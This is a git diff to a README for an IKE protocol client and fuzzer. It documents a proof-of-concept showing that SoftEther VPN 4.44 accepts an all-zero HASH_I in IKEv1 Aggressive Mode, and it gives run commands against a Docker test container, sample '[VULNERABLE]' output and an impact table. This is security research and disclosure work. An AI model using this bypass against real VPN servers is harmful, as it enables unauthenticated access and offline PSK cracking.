@@ -23,6 +23,7 @@ authentication, plus a structured protocol fuzzer.
 | Protocol fuzzer — random byte-flip | Working — reproducible via `--seed`, IKEv1/v2 field-labelled |
 | strongSwan Docker test environment | Available — `docker/strongswan/` |
 | SoftEther VPN Docker test environment | Available — `docker/softether/` |
+| PoC — SoftEther HASH_I non-verification | `poc_softether_hash_i.py` — confirmed vulnerable |
 
 ## Files
 
@@ -30,6 +31,7 @@ authentication, plus a structured protocol fuzzer.
 |------|---------|
 | `ike_client.py` | IKEv1 / IKEv2 client — select with `--version 1` or `--version 2` |
 | `ike_fuzzer.py` | Protocol fuzzer — IKEv1 and IKEv2 structured and random mutations |
+| `poc_softether_hash_i.py` | PoC — SoftEther HASH_I non-verification in Aggressive Mode |
 | `requirements.txt` | Python dependencies |
 | `docker/strongswan/` | strongSwan 5.9 responder — IKEv1 + IKEv2, all algorithm variants |
 | `docker/softether/` | SoftEther VPN 4.44 responder — IKEv1 only, pure userspace |
@@ -827,13 +829,15 @@ all 100 random cases rejected or timed out). Two structured cases were accepted:
 
 SoftEther does not verify the initiator's HASH_I payload in Aggressive Mode
 message 3. A client authenticating with a completely wrong PSK still receives
-an `ISAKMP SA established` response:
+an `ISAKMP SA established` response. **See `poc_softether_hash_i.py` for a
+working proof-of-concept.**
 
+RFC 2409 §5.4 requires the responder to verify:
 ```
-# Observed behaviour — wrong PSK accepted by SoftEther in Aggressive Mode
-HASH_R mismatch (our client detects it, SoftEther doesn't care)
-SoftEther responds: SA established
+HASH_I = prf(SKEYID, g^xi | g^xr | CKY-I | CKY-R | SAi_b | IDii_b)
 ```
+SoftEther accepts any value in that field — including 20 bytes of `0x00`
+encrypted with keys derived from a completely wrong PSK.
 
 This means SoftEther provides no mutual authentication in Aggressive Mode — the
 responder authenticates itself via HASH_R (visible in message 2), but the
@@ -844,6 +848,84 @@ This finding also revealed a bug in `ike_client.py`: `_verify_hash_r()` was
 logging a warning instead of raising an error, allowing the exchange to silently
 proceed with wrong keys. Fixed in commit `68550ea` — HASH_R mismatch now raises
 `AuthenticationError` and aborts immediately.
+
+---
+
+## Proof of Concept — SoftEther HASH_I non-verification
+
+**File:** `poc_softether_hash_i.py`
+
+Demonstrates that SoftEther VPN Server 4.44 accepts an IKEv1 Aggressive Mode
+Phase 1 handshake with a completely bogus HASH_I (all-zero bytes), even when
+keys are derived from a wrong PSK. strongSwan rejects the same attempt immediately
+with an Informational Notify.
+
+### How it works
+
+The PoC subclasses `IKEv1Client` and overrides `_compute_hash_i()` to return
+zeroed bytes. It then runs a normal Aggressive Mode exchange and listens for 2 s
+after message 3 for an Informational error response:
+
+- **SoftEther:** silent acceptance — no error Notify is returned. Phase 1 SA
+  established with `HASH_I = 0x0000…0000`.
+- **strongSwan:** exchange type 5 (Informational) error Notify returned
+  immediately — exchange rejected.
+
+### Usage
+
+```bash
+# Start SoftEther container first
+cd docker/softether && docker build -t ike-test-softether .
+docker run --rm --network host -e SE_PSK=secret ike-test-softether
+```
+
+```bash
+# Bogus HASH_I — correct PSK used for encryption keys (ACCEPTED by SoftEther)
+python poc_softether_hash_i.py
+
+# Bogus HASH_I — entirely wrong PSK for all key material (still ACCEPTED)
+python poc_softether_hash_i.py --wrong-psk
+
+# Compare against strongSwan on a second host (strongSwan rejects)
+python poc_softether_hash_i.py --compare <strongswan-host>
+```
+
+### Expected output
+
+```
+======================================================================
+  PoC: SoftEther IKEv1 Aggressive Mode — HASH_I Not Verified
+======================================================================
+
+  Target      : 127.0.0.1:500
+  PSK in use  : 'definitely_not_the_psk_xyzzy_12345'
+  HASH_I sent : <all zeros — 20 bytes of 0x00>
+
+  NOTE: --wrong-psk mode — even the encryption keys are derived
+  from the wrong PSK. SoftEther still cannot tell the difference.
+
+======================================================================
+  RESULT — SoftEther (127.0.0.1)
+======================================================================
+  [VULNERABLE] Phase 1 ACCEPTED with all-zero HASH_I
+
+    host     : 127.0.0.1
+    PSK used : 'definitely_not_the_psk_xyzzy_12345'
+    HASH_I   : 0000000000000000000000000000000000000000 (all zeros)
+
+  The responder never verified the initiator's identity.
+  An attacker with no knowledge of the PSK can establish
+  a Phase 1 SA and obtain HASH_R for offline cracking.
+======================================================================
+```
+
+### Impact
+
+| Consequence | Detail |
+|-------------|--------|
+| Unauthenticated Phase 1 | Any client completes IKEv1 Aggressive Mode without knowing the PSK |
+| PSK exposure | HASH_R is transmitted in the clear in message 2, giving any observer offline cracking material — without needing to know the PSK to elicit it |
+| Identity spoofing | The IDii field is accepted at face value; SoftEther never confirms it matches the PSK |
 
 ---
 
